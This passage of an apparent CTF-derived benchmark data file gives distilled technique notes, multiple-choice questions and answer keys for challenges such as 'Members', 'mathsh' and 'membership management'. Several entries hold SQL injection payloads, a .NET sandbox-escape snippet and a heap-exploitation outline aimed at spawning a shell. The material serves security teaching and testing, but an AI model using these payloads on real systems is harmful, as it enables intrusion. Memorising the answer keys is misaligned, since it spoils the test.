        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "Man in the Mirror",
        "write_up": "dataset/raw/Man in the Mirror.md",
        "type": "The type of this CTF challenge is **forensics**.",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 500,
        "max_score": 600,
        "difficulty": 0.8333333333333334,
        "knowledge": [
            "When intercepting SSH connections to understand security vulnerability, one can utilize a debug version of SSH. This involves building SSH from source with debug options enabled. This action allows for verbose output that can include cryptographic key material and authentication attempts, which are crucial for deeper security analysis and reverse-engineering efforts. To do this:\n   - Configure SSH with debugging flags (e.g., `-DPACKET_DEBUG -DDEBUG_PK`) during the build process to enhance verbosity of logs, which could reveal sensitive cryptographic material or authentication processes.",
            "RSA cryptographic keys can be manipulated for security testing or penetration testing exercises. If possessing the public key components (modulus n and exponent e), these can be converted into a standard public key format (PEM) using tools such as RsaCtfTool. This key can subsequently be utilized to test for vulnerabilities such as weak keys or to facilitate authorized access in controlled penetration testing scenarios. The conversion process involves:\n   - Converting modulus and exponent values from hexadecimal to decimal.\n   - Utilizing RsaCtfTool or similar with the `--createpub` option, along with the decimal modulus (`--n`) and exponent (`--e`), to generate a PEM-formatted public key.\n\nExample of converting modulus n and exponent e to a PEM-formatted public key using RsaCtfTool:\n```\n$ ./RsaCtfTool.py --createpub --n [DECIMAL_MODULUS] --e [DECIMAL_EXPONENT]\n```\n(Output will be a PEM-formatted RSA public key)"
        ],
        "question": [
            "In a scenario where you are debugging SSH connections for security vulnerabilities, you have decided to build OpenSSH from source with enhanced debugging capabilities. Which of the following configuration and flag additions during the build process is essential for generating detailed verbose output that includes cryptographic material and authentication attempts? - A. Run `./configure --enable-debug` and add `-DDEBUG -DVERBOSE_LOGGING` to `CFLAGS` in Makefile. - B. Run `./configure --with-debug` and add `-DDEBUG_MODE` to `CFLAGS` in Makefile. - C. Run `autoheader && autoconf && ./configure --with-pam` and add `-DPACKET_DEBUG -DDEBUG_PK` to `CFLAGS` in Makefile. - D. Run `./configure --enable-verbose` and add `-DVERBOSE_OUTPUT` to `CFLAGS` in Makefile. ",
            "If you possess the components of an RSA public key, specifically the modulus and exponent in hexadecimal format, and you wish to convert these components into a PEM-formatted public key for security testing, which process correctly represents the steps needed to achieve this using RsaCtfTool? - A. Use an online converter to change the modulus and exponent from hexadecimal to binary, then use RsaCtfTool with the `--createbin` option. - B. Directly input the hexadecimal values for modulus and exponent into RsaCtfTool without conversion. - C. Convert modulus and exponent from hexadecimal to integer in Python, then use RsaCtfTool with the `--createpub` option providing the decimal modulus (`--n`) and exponent (`--e`). - D. Manually calculate the decimal values of the modulus and exponent, then use a standard text editor to create a PEM file. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "Many Paths",
        "write_up": "dataset/raw/Many Paths.md",
        "type": "web",
        "competition": [
            "X-MAS/2020",
            "https://ctftime.org/event/1209/tasks/"
        ],
        "score": 400,
        "max_score": 500,
        "difficulty": 0.8,
        "knowledge": [
            "In challenges involving paths or steps computations, where the goal is to find the number of ways to reach a certain node with a given number of steps, dynamic programming (DP) can be a viable solution. Specifically, use a 2-dimensional DP array where `dp[i][j]` represents the number of ways to reach the j-th node with i-th steps. This approach can be optimized by using an adjacency list instead of an adjacency matrix, and by implementing the solution in a compiled language like C++ to handle large input sizes more efficiently.",
            "For challenges that involve calculating large powers in the context of paths or steps computation, converting the problem into one of matrix multiplication can lead to significant reductions in time complexity. Instead of performing the operation in a linear manner, take advantage of exponential multiplication techniques to calculate power of matrices. This approach leverages the property that a matrix raised to a power can be computed efficiently using a logarithmic number of multiplication steps (e.g., to compute \\(M^{16}\\), calculate \\(M^8\\) and square it, and so on), leading to a time complexity of \\(O(\\log L)\\), where \\(L\\) is the power to which the matrix is raised. This technique is particularly useful when dealing with dynamic programming problems where the next state is a linear combination of previous states."
        ],
        "question": [
            "When solving a challenge involving the calculation of paths or steps to reach a certain node within a large input range, which optimization technique improves the efficiency of a dynamic programming solution significantly? - A. Use a 3-dimensional DP array for reducing the complexity. - B. Convert the problem into a linear algebra problem solved through determinant calculations. - C. Use an adjacency list instead of an adjacency matrix and implement the solution in C++ for enhanced performance. - D. Increase the base case values to reduce the overall number of recursive calls.",
            "In the context of reducing time complexity for calculations involving large powers in paths or steps computation challenges, what technique is recommended for efficiently computing the power of matrices? - A. Perform linear addition of matrices until the desired power is achieved. - B. Utilize an adjacency list to represent the matrix and compute its power through repeated multiplications. - C. Apply exponential multiplication by squaring the matrix for each multiplication step, enabling calculations in logarithmic time. - D. Increase the precision of floating-point calculations to ensure the accuracy of large power computations."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "maotiplication",
        "write_up": "dataset/raw/maotiplication.md",
        "type": "The type of this challenge is **crypto**.",
        "competition": [
            "corCTF/2021",
            "https://ctftime.org/event/1364/tasks/"
        ],
        "score": 498,
        "max_score": 500,
        "difficulty": 0.996,
        "knowledge": [
            "In challenges involving string replacement or transformation interpreters, leveraging empty strings in substitution rules can be a powerful technique. By using an empty SEARCH string, text can be inserted at the beginning of the input string, and by employing a terminating substitution rule (double colon syntax), the interpreter can be forced to cease processing further substitutions. This approach is particularly useful in scenarios requiring the addition of a specific string at a certain position or the replacement of repeated instances of a string with a single instance.\n   \n   Example payload for terminating after adding a specific string:  \n   ```\n   ::addedString\n   EOF\n   ```",
            "When tasked with performing arithmetic operations (e.g., XOR, multiplication) on input strings within a constrained rule-based system, it's effective to encode the digits or states using alternative characters (e.g., 'a' and 'b' for binary digits in the XOR operation or 'c', 'd', 'g', 'h', 'i' for the multiplication steps) to signal different processing steps or statuses. This allows for the simulation of complex operations like multiplication and addition by sequentially processing and transforming the inputs according to the makeshift state machine implemented via substitution rules. Creative application of these rules enables the emulation of bitwise operations and arithmetic processes, even in contexts lacking direct support for these operations.\n\n   Example payload for simulating XOR operation:  \n   ```\n   0^:#a\n   1^:#b\n   a0:0a\n   a1:1a\n   b0:0b\n   b1:1b\n   0a%:%0\n   1a%:%1\n   EOF\n   ```"
        ],
        "question": [
            "In a scenario where you are utilizing a string substitution interpreter for input transformation, how would you insert a specific string at the beginning of the input and ensure no further substitutions are processed? - A. Use the rule format `SEARCH:REPLACE` with both SEARCH and REPLACE being non-empty strings. - B. Use a double colon in the substitution rule, where SEARCH is non-empty and REPLACE is the string to be added at the beginning, to stop further processing. - C. Utilize an empty SEARCH string in the rule and a terminating rule (double colon syntax) to add a string at the beginning and cease further substitutions. - D. Insert the string at the beginning of each input line without using any specific substitution rule format.",
            "To simulate an XOR operation on two binary strings using a constrained rule-based system, which approach is effective? - A. Directly apply the XOR operation using a built-in function provided by the interpreter. - B. Encode the binary digits with alphabetical characters and use sequential substitution rules to simulate the XOR logic. - C. Convert the binary strings into decimal, perform the XOR operation, and convert back to binary without using substitution rules. - D. Use substitution rules that directly replace binary strings with their XOR results without encoding states or digits."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Marian Croak",
        "write_up": "dataset/raw/Marian Croak.md",
        "type": "The type of CTF challenge in this write-up is: forensics",
        "competition": [
            "CyberHeroines/2023",
            "https://ctftime.org/event/2054/tasks/"
        ],
        "score": 300,
        "max_score": 400,
        "difficulty": 0.75,
        "knowledge": [
            "When dealing with challenges that provide disk images, utilize forensic analysis tools such as Autopsy to explore the disk image for deleted or hidden items which might contain valuable information for the challenge.",
            "For challenges involving VoIP technology, especially when a pcap (Packet Capture) file is discovered, use Wireshark to analyze the packets with a focus on the SIP (Session Initiation Protocol) packets. In Wireshark, navigate through *Telephony -> VoIP Calls* to review and potentially play back the VoIP calls, which may contain auditory clues or the flag itself."
        ],
        "question": [
            "In a challenge that includes a disk image, which forensic analysis tool is recommended to examine the disk for potentially deleted or hidden clues? - A. GCC - B. Autopsy - C. GDB - D. Photoshop",
            "When a pcap file related to VoIP technology is found in a cybersecurity challenge, which function in Wireshark is essential to analyze SIP packets and possibly play back VoIP calls that may reveal vital clues? - A. Follow TCP Stream - B. Analyze Response Time - C. VoIP Calls under Telephony - D. Get Endpoints List"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "MathGame",
        "write_up": "dataset/raw/MathGame.md",
        "type": "crypto",
        "competition": [
            "N1CTF/2018",
            "https://ctftime.org/event/584/tasks/"
        ],
        "score": 714,
        "max_score": 1000,
        "difficulty": 0.714,
        "knowledge": [
            "When dealing with puzzles or CTF challenges that involve identifying unique or 'special' elements within a dataset based on specific rules (e.g., even/odd, prime/non-prime, number of divisors), it is effective to utilize filter functions alongside these rules to narrow down potential candidates. This can be further enhanced by leveraging mathematical libraries (e.g., `gmpy2` for prime checking) for efficient computation. For example, to find numbers with exactly three divisors within a larger matrix of numbers:\n```python\n# Assuming 'matrix' is a dictionary with coordinates as keys and numbers as values\nprimes = get_primes(1000000)  # Generate a list of primes for checking\nthree_divisors = list(filter(lambda x: len(factor_p(x[1], primes, 100000)[0]) == 3, matrix.items()))\n```",
            "For geometric or spatial problems that involve identifying specific patterns or intersections within a 3D space, such as finding a cube within a cube or calculating the intersection point of lines, leveraging vector calculations and geometry libraries (e.g., `shapely` for Python) can simplify complex spatial reasoning. The process involves:\n   - Calculating vectors between pairs of points.\n   - Identifying perpendicular vectors by checking if their dot product equals zero.\n   - Computing the intersection point of two lines represented by these vectors.\n   - Determining if the intersection point is within a specified area or boundary (e.g., an internal cube).\n   \nExample code snippet to find the intersection of two lines and check if it is within a desired space:\n```python\nfrom shapely.geometry import LineString\nimport numpy\n\ndef calculate_vector(start, end):\n    return end[0] - start[0], end[1] - start[1], end[2] - start[2]\n\ndef find_intersection(line1, line2):\n    A, B = line1\n    C, D = line2\n    line1 = LineString([A, B])\n    line2 = LineString([C, D])\n    result = line1.intersection(line2)\n    if \"POINT Z\" in str(result):\n        # Convert result to an integer tuple, rounding as necessary\n        return tuple(map(int, map(numpy.round, map(float, re.findall(\"(\\d+\\.?\\d*)\", str(result))))))\n    else:\n        return ()\n\ndef is_internal_cube(intersection, boundary=6):\n    # Check if the intersection point lies within the internal cube boundary (0 < axis < boundary for all axes)\n    return all(0 < intersection[i] < boundary for i in range(3))\n```\nThis approach can be applied across a variety of spatial reasoning challenges where identifying relationships between geometric shapes or points is required."
        ],
        "question": [
            "In a given Python script aimed at solving a puzzle where identifying numbers with a specific amount of divisors is required, which function correctly implements the search for numbers within a dictionary of coordinates and values that exactly have three divisors, given a pre-defined list of prime numbers? - A. Use a `filter` function along with a custom lambda that uses the `len()` of the `factor_p()` function's return value, comparing it against 3. - B. Implement a for-loop to iterate over each item in the dictionary, manually checking the divisibility of each value against every number up to itself. - C. Create a list comprehension that includes all items from the dictionary where the item value raises to the power of 2. - D. Apply a map function to the dictionary's values, directly passing each value to the `is_prime()` function from the `gmpy2` module. ",
            "When attempting to calculate the intersection point of two lines in a 3D challenge, utilizing vector calculations and the `shapely` library, which of the following code snippets correctly describes the process of calculating vectors between points, finding perpendicular vectors, and determining if an intersection point is internal to a specific cube? - A. Calculate vectors using differences in coordinates, identify perpendicular vectors through their dot product, use `shapely` to find intersections, and check if the intersection is within the cube's bounds. - B. Leverage cross products of vectors to compute intersections directly, bypassing the need for external libraries and checking for internal points by ensuring the intersection's coordinates are positive. - C. Use a fixed array of directional vectors to represent lines, compare each pair with a predefined set of perpendicular bases, and manually compute any intersection points. - D. Implement a brute-force search for all possible intersection points within the cube, then check each point against the original lines' equations to find matches. "
        ],
        "answer": [
            "A",
            "A"
        ]
    },
    {
        "name": "mathsh",
        "write_up": "dataset/raw/mathsh.md",
        "type": "misc",
        "competition": [
            "GoogleCTF/2020",
            "https://ctftime.org/event/1041/tasks/"
        ],
        "score": 453,
        "max_score": 474,
        "difficulty": 0.9556962025316456,
        "knowledge": [
            "When dealing with .NET-based CTF challenges that involve sandbox escape, reflection and the use of `System.Security` namespaces are crucial. By leveraging methods marked with `SecuritySafeCritical` attribute and the use of `Assert` to modify permission checks, it's possible to bypass sandbox restrictions. Specifically, using the `Assert` method effectively stops the permission check at a certain point in the call stack, allowing code to execute with more privileges than otherwise allowed under normal sandbox constraints. This approach is particularly useful when the challenge restricts the direct execution of privileged methods but allows indirect execution through reflection or other means.",
            "In sandbox escape challenges, if directly calling security-critical methods is restricted, leveraging reflection to modify private fields of method info objects can bypass these restrictions. This is done by changing the `m_invocationFlags` of a `MethodInfo` object to remove the `NEED_SECURITY` flag, which allows security-transparent code to invoke security-critical methods. This method requires in-depth knowledge of .NET internals and reflection capabilities but offers a powerful way to elevate privileges of code executed within a restricted .NET AppDomain.\n\nExample of using reflection to modify `m_invocationFlags` and bypass security restrictions:\n```csharp\npublic static void ResetInvocationFlags(Object methodInfoObject) {\n    var flagsField = methodInfoObject.GetType().GetField(\"m_invocationFlags\", BindingFlags.Instance | BindingFlags.NonPublic);\n    var modifiedFlags = flagsField.GetValue(null) & ~INVOCATION_FLAGS.NEED_SECURITY; // Assuming INVOCATION_FLAGS is an enum with appropriate flags.\n    flagsField.SetValue(methodInfoObject, modifiedFlags);\n}\n```\n\n**Note:** This example assumes the existence of an `INVOCATION_FLAGS` enum and appropriately sets the `modifiedFlags` by removing the `NEED_SECURITY` flag. This technique relies on specific .NET Framework internals and reflection capabilities."
        ],
        "question": [
            "In a .NET-based sandbox escape challenge, which of the following attributes is used to mark a method that can be called in a restricted security context but can perform privileged actions, thus allowing an exploit to bypass sandbox constraints? - A. SecurityTransparent - B. SecurityCritical - C. SecuritySafeCritical - D. None of the above ",
            "When attempting to invoke a security-critical method from security-transparent code within a .NET AppDomain sandbox escape challenge, which private field of a `MethodInfo` object must be modified to bypass the restriction that prevents security-transparent code from calling security-critical methods? - A. m_securityAttributes - B. m_handle - C. m_invocationFlags - D. m_methodHandle "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Matrix LED",
        "write_up": "dataset/raw/Matrix LED.md",
        "type": "reverse",
        "competition": [
            "TokyoWesterns/2018",
            "https://ctftime.org/event/651/tasks/"
        ],
        "score": 462,
        "max_score": 840,
        "difficulty": 0.55,
        "knowledge": [
            "In challenges involving hardware signal decoding, such as LED color sequences representing data, it's effective to use computer vision techniques for interpreting signals. Specifically, classification of colors to represent bits of information can be achieved by calculating the Euclidean distance from sampled colors to a pre-defined set of reference colors. This approach converts visual data into a binary or hexadecimal representation, which can then be further processed. For instance, eight distinct colors could represent three bits each, thereby encoding substantial data within a limited set of signals.\n   \n   Example pseudocode snippet for color classification based on Euclidean distance:\n   ```python\n   def classify_color(sampled_color):\n       reference_colors = [('red', (255, 0, 0)), ('green', (0, 255, 0)), ...]  # Define reference colors\n       closest_match = min(reference_colors, key=lambda color: euclidean_distance(sampled_color, color[1]))\n       return closest_match[0]\n   ```",
            "When dealing with encrypted data that includes checksum validation, especially in scenarios where direct decryption or checksum calculation reversal is challenging, using simulation tools such as `simavr` for AVR microcontroller binaries can effectively bypass complex reverse-engineering processes. This approach uses the binary's own logic to validate or correct data, particularly useful when a checksum needs to match for successful decryption or data interpretation. This technique allows for error correction in data transcription processes, improving the reliability of recovering encrypted or encoded messages without fully understanding the underlying checksum or encryption algorithm.\n\n   Example concept (No specific payload): Use the `simavr` tool to run the binary against input data variants to check for checksum consistency and validate correctness of the decrypted or transcribed data, correcting errors based on feedback from the simulation."
        ],
        "question": [
            "When interpreting LED color sequences to represent data, which method can be effectively used to classify colors and convert them into binary or hexadecimal data? - A. Calculating the arithmetic mean of all colors and comparing with a threshold. - B. Using a fixed color for all data encoding and decoding based on brightness levels. - C. Calculating the Euclidean distance from sampled colors to a pre-defined set of reference colors for classification. - D. Assigning random colors to bits and decoding based on a predetermined random seed.",
            "In scenarios where encrypted data includes a checksum for validation, making direct decryption or checksum calculation challenging, which approach can be effectively used to bypass complex reverse-engineering processes? - A. Manually decrypting the data based on a guessed encryption key. - B. Using OCR (Optical Character Recognition) to directly interpret and validate encrypted messages. - C. Employing simulation tools like `simavr` for AVR microcontroller binaries to validate or correct data based on the binary's own logic. - D. Creating a custom encryption algorithm to replace the original one and decrypt the data."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "mDLP",
        "write_up": "dataset/raw/mDLP.md",
        "type": "crypto",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 262,
        "max_score": 953,
        "difficulty": 0.27492130115424973,
        "knowledge": [
            "When facing cryptography challenges involving matrices and the Discrete Logarithm Problem (DLP), diagonalizing the given matrix to find its eigenvalues can simplify the process. If the prime factors of \\(p-1\\) (where \\(p\\) is a prime number from the public key) are known and manageable, one can use the Chinese Remainder Theorem (CRT) to solve for discrete logarithms within the matrix. This technique greatly reduces the complexity of breaking the cipher.",
            "To decrypt a ciphertext matrix \\(C\\), after determining the discrete logarithm \\(r\\) and \\(d\\) using eigenvalues and the CRT as mentioned, compute the inverse of \\(A^{rd}\\), where \\(A\\) is the base matrix and \\(r\\), \\(d\\) are the discrete logarithms found. Multiplying this inverse matrix by the ciphertext matrix \\(C\\) can yield the plaintext matrix \\(P\\), allowing for the decryption of the message.\n\nSample of Payload for decryption (key steps):\n```python\n# Define matrices A (base matrix), Ad (A to the power d), and Ar (A to the power r)\n# Calculate eigenvalues of A and define matrices P and Q (Q being the inverse of P)\n# Use CRT to find r and d\n# Calculate the inverse of A**(r*d) to decrypt C and retrieve P (plaintext matrix)\n# Convert matrix elements into bytes to extract the flag\n```"
        ],
        "question": [
            "When solving the Discrete Logarithm Problem (DLP) for a matrix where `p` is a prime number and the prime factors of `p-1` are known, what is the next step after diagonalizing the matrix and finding its eigenvalues to further simplify the problem and decrypt the cipher? - A. Apply the Euclidean algorithm to each matrix element for simplification. - B. Use the Chinese Remainder Theorem (CRT) with the eigenvalues to solve for discrete logarithms. - C. Perform a brute-force search for all possible values of `p-1`. - D. Multiply each eigenvalue by `p-1` to directly obtain the decryption key.",
            "In the process of decrypting a ciphertext matrix `C` by computing the inverse of `A**(r*d)`, given that `A` is the base matrix and `r`, `d` are the discrete logarithms found using eigenvalues and the Chinese Remainder Theorem (CRT), what is the ultimate goal of this computation? - A. To multiply the inverse matrix by `C` to yield the plaintext matrix `P`. - B. To add the inverse matrix to `C` to directly get the plaintext. - C. To subtract the ciphertext matrix `C` from the inverse matrix to find `P`. - D. To divide `C` by the inverse matrix for each element to decrypt the message."
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "Medias",
        "write_up": "dataset/raw/Medias.md",
        "type": "reverse",
        "competition": [
            "ASIS/2019/Quals",
            "https://ctftime.org/event/732/tasks/"
        ],
        "score": 182,
        "max_score": 500,
        "difficulty": 0.364,
        "knowledge": [
            "When facing a binary that employs time-based non-deterministic encryption, one effective strategy involves generating all possible encryption keys within the feasible range (for example, 0 to 65535) and then brute-forcing the encrypted file using these keys to find decryptable content. This approach is especially applicable when the encryption algorithm's randomness is seeded by predictable values, such as the system's current time. To operationalize this, one can use a debugger script to systematically modify the generated random value to each possible key, apply the encryption process, and compare the output against known patterns of the target data (e.g., printable characters for text files). A practical example involves using GDB (GNU Debugger) scripts to automate the generation of encryption keys by overriding the random value generator of the binary.\n\n    Example GDB command to modify the random value: `gdb.execute(\"set $rax = \"+hex(index))`",
            "In challenges involving floating-point arithmetic and string encoding to conceal ASCII characters, a reversed engineering approach can decode the obscured content. This typically involves understanding the binary's logic for encoding numbers and characters and implementing a reverse function to retrieve the original data. Specifically, if the encoding mechanism involves arithmetic operations and shifts on floating-point numbers, writing a Python script that inversely applies these operations can successfully decode the encrypted message. The methodology is particularly effective when encoded characters follow a consistent logical or arithmetic pattern that, once identified, can be algorithmically inverted to reveal the hidden message.\n\n    Example Python snippet to reverse encoding: `def fancyToDouble(res): # Reverse engineered function to decode encoded text back to floating point numbers`"
        ],
        "question": [
            "When attempting to decrypt a file encrypted with a binary that uses time-based non-deterministic encryption, which command in a GDB script would you use to assign a specific value to the register storing the current random number, thus allowing control over the encryption key used by the binary?  - A. gdb.execute(\"set $rbx = \" + str(value)) - B. gdb.execute(\"set $rax = \" + str(value)) - C. gdb.execute(\"set $eax = \" + hex(value)) - D. gdb.execute(\"set $rax = \"+hex(index)) ",
            "In the context of reversing floating-point arithmetic-based string encoding, which Python function signature is appropriate for a function designed to decode encoded ASCII characters back to their original floating-point numbers?  - A. def decodeEncodedText(encodedText): # Decodes text back to numbers - B. def reverseFloatOps(operationSequence): # Reverses float operations - C. def fancyToDouble(res): # Reverse engineered function to decode encoded text back to floating point numbers - D. def floatToAscii(inputBytes): # Converts bytes back to floating-point ascii representation "
        ],
        "answer": [
            "D.",
            "C."
        ]
    },
    {
        "name": "Medium Expectations",
        "write_up": "dataset/raw/Medium Expectations.md",
        "type": "crypto",
        "competition": [
            "BSidesTLV/2022",
            "https://ctftime.org/event/1680/tasks/"
        ],
        "score": -1,
        "max_score": 100,
        "difficulty": -1,
        "knowledge": [
            "When a CTF challenge involves generating seemingly random numbers where the seed is known and based on a static value, predictable outcomes can be exploited by replicating the random number generation logic in an attack script. This is because seeding a pseudo-random number generator (PRNG) with a constant value results in a deterministic sequence of numbers. In the challenge context, the seed was set using a hash of a known string, allowing for the replication of the PRNG sequence to predict the \"random\" values used in the game.\n   - Condition: Applicable when the random number generation in a challenge is seeded with a known and static value.\n   - Example payload: Replicate the PRNG sequence in an attacker's script using the known seed.\n     ```python\n     import hashlib, random\n     seed_value = int(hashlib.md5(b\"static_known_value\").hexdigest(), 16)\n     random.seed(seed_value)\n     # Now we can predict the random values generated by the PRNG\n     ```",
            "Automating interactions with remote services in CTF challenges can be effectively achieved using network scripting tools like pwntools. This facilitates sending and receiving data based on the predicted outcomes of the challenge's logic, allowing for swift and automated flag retrieval. This method is particularly useful when dealing with challenges that require repetitive tasks or where the solution involves iterating over a predictable set of values.\n   - Condition: Useful in challenges where automated input/output interaction with a remote service is required to exploit a vulnerability or logic flaw.\n   - Example payload: Use pwntools to automate interactions, sending pre-calculated inputs to meet the challenge conditions.\n     ```python\n     from pwn import remote\n     import random, hashlib\n     \n     # Configuration for the remote service\n     host, port = 'challenge.ctf.example.com', 1234\n     \n     # Establish the connection\n     p = remote(host, port)\n     \n     # Seed the PRNG as per the challenge's logic\n     random.seed(int(hashlib.md5(b\"static_known_value\").hexdigest(), 16))\n     \n     # Send predicted values based on the replicated PRNG sequence\n     p.sendline(str(random.randint(1, 4))) # Example for suit\n     p.sendline(str(random.randint(1, 13))) # Example for value\n     ```"
        ],
        "question": [
            "When exploiting a predictable random number generator (RNG) in a cybersecurity challenge, which of the following approaches can predict the sequence of \"random\" numbers generated by the server, given the RNG was seeded with a hash of a known string?  - A. Use a different RNG algorithm to generate the sequence of numbers. - B. Replicate the server's RNG sequence in an attack script using the known seed. - C. Change the seed on the server to a known value through a vulnerability. - D. Guess the next number in the sequence using brute force attacks. ",
            "In a capture the flag (CTF) challenge requiring automated interaction with a remote service to exploit a predictable RNG sequence, which tool is best suited to automate sending pre-calculated inputs based on the known sequence of values?  - A. Use a simple telnet connection script without any specific handling for RNG prediction. - B. Employ a web scraping tool to automate form submissions based on RNG outputs. - C. Utilize pwntools to automate interactions, sending pre-calculated inputs based on a replicated RNG sequence. - D. Write a custom HTTP client in Python without utilizing any external libraries to manage socket connections. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Members",
        "write_up": "dataset/raw/Members.md",
        "type": "web",
        "competition": [
            "DaVinci/2021",
            "https://ctftime.org/event/1296/tasks/"
        ],
        "score": 66,
        "max_score": 499,
        "difficulty": 0.13226452905811623,
        "knowledge": [
            "In scenarios where a web application is interfaced with a SQL database and inputs are passed via URL parameters (indicating use of the GET method), the application may be vulnerable to SQL Injection if input validation or sanitization is not properly implemented. This vulnerability can be initially tested with payloads that alter the logic of SQL queries, such as appending a condition that always evaluates to true. Example payload: `Leonard\" OR 1=1; --`",
            "When a SQL Injection vulnerability is confirmed, it's possible to enumerate database schema information including table and column names, utilizing the `UNION` SQL command to combine a malicious query with the original query intended by the application. This approach can be particularly useful to discover hidden tables and retrieve critical data from them, including flags in CTF challenges. Information schema tables like `INFORMATION_SCHEMA.TABLES` for listing table names, and `INFORMATION_SCHEMA.COLUMNS` for finding column names within a specific table, can be targeted for this purpose. Example payload to enumerate tables: `Leonard\" UNION (SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES); --`, and to enumerate columns of a specific table: `Leonard\" UNION (SELECT COLUMN_NAME,2,3 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='supa_secret_table'); --`"
        ],
        "question": [
            "In a web application where user inputs are sent through URL parameters, an attacker tests for SQL Injection vulnerabilities by using a specific payload that modifies the SQL query logic to return all entries. Which of the following payloads exemplifies this approach? - A. `Leonard\" DROP TABLE members; --` - B. `Leonard\" AND username='admin'` - C. `Leonard\" OR 1=1; --` - D. `Leonard\" AND '1'='2` ",
            "During a web security assessment, an attacker discovers a SQL Injection vulnerability in a web application. To extract the database schema, specifically table names, the attacker uses a specific SQL command with a malicious payload. Which of the following payloads would allow the attacker to list all table names in the database? - A. `Leonard\" UNION ALL SELECT NULL, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE 'x'='x` - B. `Leonard\" UNION (SELECT TABLE_NAME,2,3 FROM INFORMATION_SCHEMA.TABLES); --` - C. `Leonard\" INSERT INTO members (username) VALUES ('hacker'); --` - D. `Leonard\" DELETE FROM members WHERE '1'='1'; --` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "membership management",
        "write_up": "dataset/raw/membership management.md",
        "type": "pwn",
        "competition": [
            "Securinets/2021/Quals",
            "https://ctftime.org/event/1308/tasks/"
        ],
        "score": 988,
        "max_score": 1000,
        "difficulty": 0.988,
        "knowledge": [
            "In challenges where Use-After-Free (UAF) vulnerabilities are present, to manipulate heap metadata, especially when `tcache` is involved and libc version is >= 2.31, one can overwrite the least significant byte (LSB) of a chunk's forward pointer (FD) to redirect it to an attacker-controlled location on the heap. This allows for the construction of a fake chunk at the redirected location, facilitating heap manipulations such as overlapping chunks or tcache poisoning.",
            "In a scenario where direct leaks are not feasible due to the absence of show functions or similar, and the challenge environment includes Full RELRO, Canary, and PIE protections, it is possible to achieve arbitrary memory write or leak a libc address by manipulating the `_IO_2_1_stdout_` structure. The exploitation involves carefully crafting a fake chunk that points to `_IO_2_1_stdout_`, then corrupting the stdout structure to control the program's output and thus leak addresses or hijack control flow. After leaking the libc address, performing tcache poisoning to overwrite a critical function pointer such as `__free_hook` with the address of a function like `system` can lead to arbitrary code execution.\n\nExample payload steps (excluding specific addresses which are dependent on runtime conditions):",
            "Allocate multiple chunks to fill tcache bins and control heap layout.",
            "Manipulate FD of a free chunk to point to a fake chunk.",
            "Craft a fake chunk and control its size and FD to manage its bin placement.",
            "Overwrite a free chunk to manage `stdout` structure, using crafted input to alter the `stdout` and leak libc or control execution.",
            "Exploit tcache poisoning to overwrite `__free_hook` with `system` address, then trigger `free` on a controlled string to execute a command (e.g., spawning a shell).\n\nPayload specifics, such as how to craft the fake chunk or the exact input to modify `stdout`, depend on the target binary's memory layout and protections."
        ],
        "question": [
            "In a scenario with a Use-After-Free vulnerability exploiting a tcache mechanism when libc version is 2.31 or later, what step is key to manipulating the heap to point to an attacker-controlled location?  - A. Overwrite the most significant byte (MSB) of the chunk's backward pointer (BK) to redirect it to a random heap location. - B. Overwrite the least significant byte (LSB) of a chunk's forward pointer (FD) to redirect it to an attacker-controlled location on the heap. - C. Increase the size of the chunk's `prev_size` field to overlap with the next chunk in memory. - D. Decrease the chunk's size field to force it into a smaller tcache bin. ",
            "When direct leaks are not possible due to lack of show functions or similar, and the challenge implements protections such as Full RELRO, Canary, and PIE, which method allows for arbitrary memory write or leaking a libc address without requiring direct memory access?  - A. Executing an out-of-bounds write to overwrite the Global Offset Table (GOT). - B. Utilizing an Uninitialized Read vulnerability to leak stack canaries. - C. Manipulating the `_IO_2_1_stdout_` structure to influence the program's output, allowing for address leaks and arbitrary writes. - D. Forcing an integer overflow to corrupt `__malloc_hook` with a partial overwrite. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Memory",
        "write_up": "dataset/raw/Memory.md",
        "type": "forensics",
        "competition": [
            "Dragon/2020",
            "https://ctftime.org/event/1082/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "In memory forensics challenges, the tool Volatility can be used to analyze memory image files. To determine the profile suitable for analysis, one should execute the command `volatility -f [memory_image] imageinfo`. This step is crucial for accurately configuring Volatility for further analysis. Given the right profile, one can then proceed to extract specific types of information such as the computer name, user names, and password hashes.",
            "When dealing with encrypted hashes, tools like Crackstation can be utilized to decrypt the hashes efficiently. This approach is applicable when hashes need to be converted back to plaintext (passwords, for instance) by matching them against a pre-computed lookup table of hashes vs. plaintext values. To utilize this, one must simply submit the hash to Crackstation and retrieve the corresponding plaintext result, if available.\n\nExample scenario where this knowledge is applicable:  \nWhen encountering a memory dump file in a CTF challenge, first identify the system specifications and important artifacts using Volatility by determining the profile. Following this, if password hashes are found and need to be decrypted for crafting the flag or for further exploitation, use Crackstation to potentially crack the hashes.\n\nExample Command for Volatility:  \n`$ volatility -f [memory_image] --profile=[Detected_Profile] printkey -K 'Software\\Microsoft\\Windows NT\\CurrentVersion'`\n\nThere is no specific example payload for using Crackstation as it involves simply inputting the hash into the website's interface."
        ],
        "question": [
            "In a memory forensics challenge, to accurately configure the Volatility tool for analyzing a Windows 7 memory image file, which of the following profiles should likely be used after executing the `volatility -f foren.raw imageinfo` command and obtaining suggested profiles including Win7SP1x64?  - A. WinXPSP2x86 - B. Win7SP1x64 - C. LinuxUbuntux64 - D. MacOSX ",
